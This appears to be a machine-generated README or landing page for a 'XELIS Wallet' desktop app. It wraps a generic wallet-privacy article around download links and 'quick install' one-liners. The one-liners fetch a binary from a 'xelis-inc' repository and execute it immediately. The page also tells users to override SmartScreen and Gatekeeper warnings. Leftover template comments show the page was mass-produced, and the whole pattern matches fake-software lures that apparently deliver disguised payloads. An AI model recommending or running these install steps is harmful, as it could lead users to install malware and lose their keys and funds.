![Private wallet basics: where XELIS Wallet fits](assets/banner-article.png)
# Private wallet basics: where XELIS Wallet fits

Custody, confidentiality and platform: the three criteria that decide it.

## Downloads - Privacy

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> There is no most-private wallet, only a threat model that fits or does not.

A private wallet is defined by two things: who holds the keys and what the chain hides. XELIS Wallet is non-custodial and its chain encrypts amounts by default, while participation, addresses and your network connection remain visible.

<!-- ARTICLE-BODY-BEGIN -->
## Decide what private has to mean for you

Privacy is a set of separate promises, and they fail independently. Balance confidentiality stops someone reading how much an address holds. Linkability is a different problem: whether an address can be tied to a person. Device security is a third: whether the key survives a stolen laptop.

Naming which of those you care about turns a vague shopping question into three checks you can actually run.

## The three criteria

**Custody.** If a service holds the keys, it can freeze, limit or lose the balance, and your privacy depends on its policies. Self-custody moves that risk to you, together with the backup duty; <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md">XELIS Wallet self-custody</a> sets out what that means in practice.

**On-chain confidentiality.** Amounts either are encrypted or are not. A chain that publishes them exposes your balance to anyone who learns your address, and no client setting changes that. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md">XELIS Wallet privacy limits</a> is the honest breakdown for this chain.

**Where the keys live.** A general-purpose computer, a phone or a dedicated device each carries a different threat. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-hardware-custody-comparison.md">Hardware versus software wallets</a> compares the two models without pretending one wins.

## How XELIS Wallet scores on each

Custody: keys are generated and stored on your device, so no counterparty can block a payment. Confidentiality: amounts and balances are encrypted by default, while the transaction graph, addresses and timing stay public. Platform: a desktop application installed from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, which means a supported OS and a machine you keep clean.

That is a strong answer to balance surveillance and a weak one to linkability. Anyone who needs the second should treat network-level habits, not the wallet's feature list, as the deciding factor.

## The claims to distrust

Any product described as anonymous, impossible to compromise or the most private is being sold rather than explained. Privacy is a property of a whole setup: the chain, the client, the machine, the network and the person using them.

A wallet can be the right choice for one threat model and the wrong one for another, and a page that refuses to say which is doing you no favours.

## FAQ
### What crypto wallet is best for beginners?
One with few steps, a phrase you can back up and no account to lose. XELIS Wallet fits that shape on desktop; nothing here ranks it above other wallets.

### Which wallet can I use for crypto?
Any non-custodial client that supports the asset and the network you hold. Asset support is the binding constraint, not brand.

### Which is the safest crypto wallet to use?
There is no ranking. The safest is the one whose failure mode you can manage: offline keys, a verified phrase and a machine you control.

### Which private crypto wallet should I use?
Pick by what you need hidden. For balance confidentiality this chain qualifies; for hiding participation, no wallet in this category solves it alone.

### Are private crypto wallets anonymous?
No. Confidential amounts hide values, not the fact of a transaction, and addresses stay pseudonymous until something outside the chain links them.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet privacy limits](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md)
- [XELIS Wallet self-custody](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [Hardware versus software wallets](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-hardware-custody-comparison.md)
- [Confidential transactions](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-confidential-transactions.md)
